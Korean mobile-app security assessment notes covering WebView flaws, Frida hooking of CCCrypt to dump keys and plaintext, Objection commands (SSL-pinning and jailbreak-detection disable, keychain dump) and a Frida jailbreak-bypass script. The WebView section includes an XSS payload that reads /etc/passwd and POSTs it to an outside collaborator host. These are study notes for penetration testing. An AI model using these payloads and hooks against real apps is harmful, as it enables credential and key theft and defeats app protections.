		- 디버깅 툴(Frida)과 리버싱 툴(Ghidra)등을 이용하여 취약점 진단을 수행
	웹 앱(Web App)
		웹 브라우저를 통해 사용할 수 있는 앱을 말하며, 네이티브 앱처럼 보이도록 구현되어 있다.
		- 네이티브 앱과 달리 *웹 기반의 언어로 개발된다.
		*웹 기반 언어 : HTML, CSS, Javascript 등.
		도메인에 'm'이 붙은 사이트들이 대표적인 예시
		웹 애플리케이션 취약점 진단 체크리스트를 기준으로, 웹 프록시 툴(BurpSuite)을 사용하여 진단을 수행
	모바일 웹(Mobile Web)
		웹 앱과 같이 웹 브라우저를 통해 사용할 수 있고, 동일한 장단점, 풀 브라우저 방식(Full Browsing)
			화면 일부분이 변경될 때 화면 전체 내용을 서버에서 새로 받아오는 방식
			페이지 리로드(Page Reload) 시 전체 내용을 새로 받아와야 하기 때문에 단일 페이지 방식보다 속도가 느리다.
		스크톱 웹 브라우저 화면과 큰 차이가 없고 크기만 줄어든 사이트들이 하나의 예시이다.
		웹 애플리케이션 취약점 진단 체크리스트를 기준으로, 웹 프록시 툴(BurpSuite)을 사용하여 진단을 수행
	하이브리드 앱(Hybrid APP)
		네이티브 앱과 웹 앱의 개발 방식을 모두 사용한 방식을 말한다
		- 앱의 화면이나 주요 기능 등은 웹 기반 언어로 개발되고, 웹뷰(WebView)를 통해 동작한다.
		*웹뷰 : 모바일 앱에 내장된 미니 웹 브라우저.
		- 웹뷰는 JavaScript 인터페이스를 통해 앱과 데이터를 주고받을 수 있다.
		- 겉모습은 일반 사용자가 보기엔 네이티브 앱처럼 느껴진다.
		- 네이버, 다음, 구글 등
		- 웹으로 동작하는 기능은 "2. 웹 앱, 모바일 앱"과 동일하게 취약점 진단을 수행한다.
		- 그 외 기능은 "1. 네이티브 앱"과 동일하게 취약점 진단을 수행 
		*다양한 이유로 Javascript 파일이 앱 내 저장공간에 존재하는 경우가 있다. 
		이때 Javascript 파일에 대한 암호화가 이루어지지 않을 경우, 공격자가 파일의 내용을 변조하여 보안기능을 우회할 수 있으므로 암호화 여부를 꼭 체크
	
	iOS 웹뷰는 UIWebView, WKWebView 2개가 존재하며 iOS 12.0부터는 WKWebView만 사용이 가능
		file:// 스키마는 ​​활성화되어 있지만 기본적으로 파일에 액세스할 수는 없음. 
	웹뷰 취약점
		인젝션으로 인해 디바이스에서 기본 기능 호출 및 악의적인 액티비티 수행이 가능
			EX_NULL baseURL로 설정된 웹뷰에서 아래와 같은 XSS공격을 수행할 경우 시스템 계정정보가 해커에게 전송
				baseURL을 @”” 로 설정 하면 안전하다고 생각합니다. 즉, 기본 URL이 빈 문자열로 지정되었기 때문에 
				공격자가 임의의 악성 웹사이트에 대한 요청을 로드할 수 없다고 생각하는 것입니다. 하지만 이는 사실이 아닙니다.
				실제로 baseURL 매개변수를 빈 문자열로 설정하면 공격자는 앱의 파일 시스템(file:// url 체계 사용)과 
				선택한 외부 웹사이트에 접근할 수 있게 되며, 기본적으로 모든 SOP 보호를 우회하게 됩니다.
					<script> 
						var request = new XMLHttpRequest();
						request.open("GET","file:///etc/passwd",false);
						request.send();
						request.open("POST","http://nc3fefxjk1kpku6504yvqzeyspyjm8.burpcollaborator.net",false);
						request.send(request.responseText);
					</script>
				이 취약점에 대한 가장 간단한 해결책은 단순히 baseURL 매개변수를 빈 문자열 대신 'about:blank' 로 설정하는 것입니다. 
				예를 들어: [webView loadHTMLString:someHTMLstring baseURL:[NSURL URLWithString:@"about:blank"]]
		대응방법
			- UIWebView을 사용한다면 WKWebView으로 재 빌드 해야함.
			사용자가 입력하는 값에 대한 유효성 검사 필요.
			력 값을 DB에 저장할 때, DB에서 값을 불러올 때 아래와 같은 특수문자를 변환하여 인젝션 공격을 예방
			웹뷰에서의 자바스크립트 실행을 원치 않는다면 아래의 코드를 사용하여 비활성화시킨다.
				let webPreferences = WKPreferences()
				webPreferences.javaScriptEnabled = false
				self.configuration?.preferences = webPreferences


CCCrypt 후킹
	데이터 암/복호화에 사용되는 함수입니다.
	해당 함수 후킹하여 관찰 시 암복호화 알고리즘, 비밀번호, 키값 등 앱 분석에 있어 중요한 정보들을 확인
	
	CCCryptorStatus CCCrypt(
		CCOperation op,         /* kCCEncrypt, etc. */
		CCAlgorithm alg,        /* kCCAlgorithmAES128, etc. */
		CCOptions options,      /* kCCOptionPKCS7Padding, etc. */
		const void *key,
		size_t keyLength,
		const void *iv,         /* optional initialization vector */
		const void *dataIn,     /* optional per op and alg */
		size_t dataInLength,
		void *dataOut,          /* data RETURNED here */
		size_t dataOutAvailable,
		size_t *dataOutMoved);  
	
	CCCrypt imported from
		후킹전에 CCCrypt 함수가 어떤 모듈로부터 import되었는지 확인
		Process.enumerateModulesSync()
			.filter(function(m){ return m['path'].toLowerCase().indexOf('.app') !=-1 ; })
			.forEach(function(m) {
				console.log(JSON.stringify(m, null, '  '));
				// to list exports use Module.enumerateExportsSync(m.name)
		});

		function infoImportsFunction(moduleName, importPattern){
			Module.enumerateImportsSync(moduleName)
			.forEach(function(m){
				if(m.name.match(importPattern)){
					console.log(JSON.stringify(m, null, ' '));
				}
			})
		CCCrypt 함수는 "libSystem.B.dylib" 모듈로부터 import된 것을 확인 가능
			infoImportsFunction("IOS_APP",/cccrypt/i)
			{ "type":"function",
			  "name":"CCCrypt",
			  "module":"/usr/lib/libSystem.B.dylib",
			  "address":"~",
			  "slot":""
			}
	Hook CCCrypt Function
		CCCrypt 함수를 후킹하여 암복호화 과정에 특이사항이 있는지 확인
		// libSystem.B.dylib 모듈로부터 import된 CCCrypt함수 후킹
		 Interceptor.attach(Module.findExportByName('libSystem.B.dylib', 'CCCrypt'), {
		   onEnter: function (args) {
			   // Save the arguments
			   this.operation   = args[0]
			   this.CCAlgorithm = args[1]
			   this.CCOptions   = args[2]
			   this.keyBytes    = args[3] 
			   this.keyLength   = args[4]
			   this.ivBuffer    = args[5]
			   this.inBuffer    = args[6] 
			   this.inLength    = args[7]
			   this.outBuffer   = args[8] 
			   this.outLength   = args[9]
			   this.outCountPtr = args[10]
			   
			   console.log('\n\x1b[31mCCCrypt\x1b[0m(' + 
				   '\x1b[34moperation: \x1b[32m'   + this.operation    +', ' +
				   '\x1b[34mCCAlgorithm: \x1b[32m' + this.CCAlgorithm  +', ' +
				   '\x1b[34mCCOptions: \x1b[32m'   + this.CCOptions    +', ' +
				   '\x1b[34mkeyBytes: \x1b[32m'    + this.keyBytes     +', ' +
				   '\x1b[34mkeyLength: \x1b[32m'   + this.keyLength    +', ' +
				   '\x1b[34mivBuffer: \x1b[32m'    + this.ivBuffer     +', ' +
				   '\x1b[34minBuffer: \x1b[32m'    + this.inBuffer     +', ' +
				   '\x1b[34minLength: \x1b[32m'    + this.inLength     +', ' +
				   '\x1b[34moutBuffer: \x1b[32m'   + this.outBuffer    +', ' +
				   '\x1b[34moutLength: \x1b[32m'   + this.outLength    +', ' +
				   '\x1b[34moutCountPtr: \x1b[32m' + this.outCountPtr  +'\x1b[0m)\n')
				   
			   if (this.operation == 0) {
				   // Show the buffers here if this an encryption operation
				   console.log("\x1b[31mIn buffer: \x1b[0m") 
				   console.log(hexdump(ptr(this.inBuffer), {
					   length: this.inLength.toInt32(),
					   header: true,
					   ansi: true
				   }))
				   console.log("\x1b[31mKey(keyBytes): \x1b[0m")
				   console.log(hexdump(ptr(this.keyBytes), {
					   length: this.keyLength.toInt32(),
					   header: true,
					   ansi: true
				   }))
				   console.log("\x1b[31moutCountPtr: \x1b[0m")
				   console.log(hexdump(ptr(this.outCountPtr), {
					   length: 64,
					   header: true,
					   ansi: true
				   }))
				   // console.log("\x1b[31mIV: \x1b[0m")
				   // console.log(hexdump(ptr(this.ivBuffer), {
				   //     length: this.keyLength.toInt32(),
				   //     header: true,
				   //     ansi: true
				   // }))
			   }
		   },
		   onLeave: function (retVal) {
			   if (this.operation == 1) {
				   // Show the buffers here if this a decryption operation
				   console.log("\x1b[31mOut buffer: \x1b[0m")
				   console.log(hexdump(ptr(this.outBuffer), {
					   length: Memory.readUInt(this.outCountPtr),
					   header: true,
					   ansi: true
				   }))
				   console.log("\x1b[31mKey(keyBytes): \x1b[0m")
				   console.log(hexdump(ptr(this.keyBytes), {
					   length: this.keyLength.toInt32(),
					   header: true,
					   ansi: true
				   }))
				   console.log("\x1b[31moutCountPtr: \x1b[0m")
				   console.log(hexdump(ptr(this.outCountPtr), {
					   length: 64,
					   header: true,
					   ansi: true
				   }))
				  // console.log("\x1b[31mIV: \x1b[0m")
				  // console.log(hexdump(ptr(this.ivBuffer), {
				  //     length: this.keyLength.toInt32(),
				  //     header: true,
				  //     ansi: true
				  // }))
			  }
		  }
		})
		outbuffer: ~~ 0000 출력 -> 복호화된 4자리 PIN번호("0000")
		https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h.auto.html
		https://la0s.github.io/2018/12/07/iOS_Crypto/


objection
	Objection(github.com/sensepost/objection)은 frida기반의 모바일 앱 점검 도구
		// 설치
		pip install objection

		// 버전 업그레이드. 
		pip install -U objection

		// process attach.
		// Attach: objection -g <PID || Name> explore
		// Spawn: objection -g <Identifier> explore
		objection -g "프로세스이름(ex. com.apple.AppStore)" explore

		// load command before process attach
		objection -g "프로세스이름(ex. com.apple.AppStore)" explore -s "command"
		Ex) objection -g com.apple.AppStore explore -s "ios sslpinning disable"

		// custom frida script load and execute. 경로는 큰따옴표로 감싸줄 것
		import "<frida_script_full_path>"

		// iOS Keychain Dump. keychainDump 결과를 hackcatml.txt파일에 json형태로 저장.
		ios keychain dump --json hackcatml.txt
	
		ios jailbreak disable  명령어는 탈옥 탐지 우회로 DVIA에서는 제대로 동작하는듯 하다.
		하지만 보통의 앱이라면 앱을 시작할 때 탈옥탐지를 하는데 그럴 때는 objection을 실행하기전
		아래와 같은 명령어로 시작과 동시에 명령을 실행할 수 있다.
			objection -g 패키지명 explore -s "android root disable"
			objection -g 패키지명 explore -s "ios jailbreak disable"
		
		또 클래스와 메소드도 아래와 같은 명령어로 쉽게 검색
			ios hooking search methods 검색키워드
		
		의심가는 클래스에 해당하는 메소드만 검색하는 기능
			ios hooking list class_methods 클래스명
		
		env - 앱 내부 경로 확인
		ios cookies get --json
		ios sslpinning disable



https://hackcatml.tistory.com/166


iOS, Android Memory Viewer
	https://hackcatml.tistory.com/174
	





*frida로 후킹 시 알수 없는 이유로 크래시나는 경우가 있습니다. 그럴 경우, Theos 후킹 트윅 개발을 고려해볼수 있습니다.
저 같은 경우 탈옥탐지우회를 위해 fopen함수를 frida로 후킹하였는데, 알 수 없는 이유로 앱이 크래시나서 종료되었지만 Theos후킹 트윅으로는 정상적으로 결과값을 보여주었습니다.

	
const sendMessage = ObjC.classes.SecureStorage["- readFile:"];
Interceptor.attach(sendMessage.implementation, {
    onLeave: function (retval) {
        var message = ObjC.Object(retval);
        console.log("- [SecureStorage readFile:] -->\n\"" + message.toString() + "\"");
    }
});
 

Jalibareak bypass

var fileExistsAtPath = ObjC.classes.NSFileManager["- fileExistsAtPath:"];
var hideFile = 0;
var paths = [
	"/Applications/blackra1n.app",
    "/Applications/crackerxi.app",
    "/Applications/Cydia.app",
    "/Applications/FakeCarrier.app",
    "/Applications/Icy.app",
    "/Applications/IntelliScreen.app",
    "/Applications/MxTube.app",
    "/Applications/RockApp.app",
    "/Applications/SBSettings.app",
    "/Applications/WinterBoard.app",
    "/bin/bash",
    "/bin/sh",
    "/bin/su",
    "/etc/alternatives/sh",
    "/etc/apt/",
    "/etc/apt",
    "/etc/apt/sources.list.d/cydia.list",
    "/etc/apt/sources.list.d/electra.list",
    "/etc/apt/sources.list.d/sileo.sourcs",
    "/etc/apt/undecimus/undecimus.list",
    "/etc/ssh/sshd_config",
    "/jb/amfid_payload.dylib",
    "/jb/jailbreakd.plist",
    "/jb/libjailbreak.dylib",
    "/jb/lzma",
    "/jb/offsets.plists",
    "/Library/MobileSubstrate/CydiaSubstrate.dylib",
    "/Library/MobileSubstrate/DynamicLibraries/*",
    "/Library/MobileSubstrate/DynamicLibraries/LiveClock.plist",
    "/Library/MobileSubstrate/DynamicLibraries/Veency.plist",
    "/Library/MobileSubstrate/MobileSubstrate.dylib",
    "/pguntether",
    "/private/var/cache/apt",
    "/private/var/lib/apt",
    "/private/var/lib/cydia",
    "/private/var/log/syslog",
    "/private/var/mobile/Library/SBSettings/Themes",
    "/private/var/stash",
    "/private/var/tmp/cydia.log",
    "/private/var/tmp/frida-*.dylib",
    "/private/var/Users",
    "/System/Library/LaunchDaemons/com.ikey.bbot.plist",
    "/System/Library/LaunchDaemons/com.saurik.Cydia.Startup.plist",
    "/usr/bin/cycript",
    "/usr/bin/ssh",
    "/usr/bin/sshd",
    "/usr/lib/libjailbreak.dylib",
    "/usr/libexec/cydia/firmware.sh",
    "/usr/libexec/sftp-server",
    "/usr/libexec/sshd-keygen-wrapper",
    "/usr/libexec/ssh-keysign",
    "/usr/sbin/frida-server",
    "/usr/sbin/sshd",
    "/usr/share/jailbreak/injectme.plist",
    "/var/cache/apt",
    "/var/lib/apt",
    "/var/lib/cydia",
    "/var/lib/dpkg/info/mobilesubstrate.dylib",
    "/var/log/apt",
    "/var/mobile/Library/Caches/com.saurik.Cydia/sources.list",
    "/var/mobile/Media/.evasi0n7_installed",
    "/var/tmp/cydia.log",
    "/.bootstrapped_electra",
    "/.cydia_no_stash",
    "/.installed_unc0ver"
	];

Interceptor.attach(fileExistsAtPath.implementation, {
    onEnter: function(args) {
	var path = ObjC.Object(args[2]);

	if (paths.indexOf(path.toString()) > -1) {
	    console.log("Found Jailbreak Check: " + path.toString());
	    hideFile = 1;
	}},

    onLeave: function(retval) {
	if (hideFile) {
	    console.log("0x0 change");
	    retval.replace(0);
	    hideFile = 0;
	}}
});
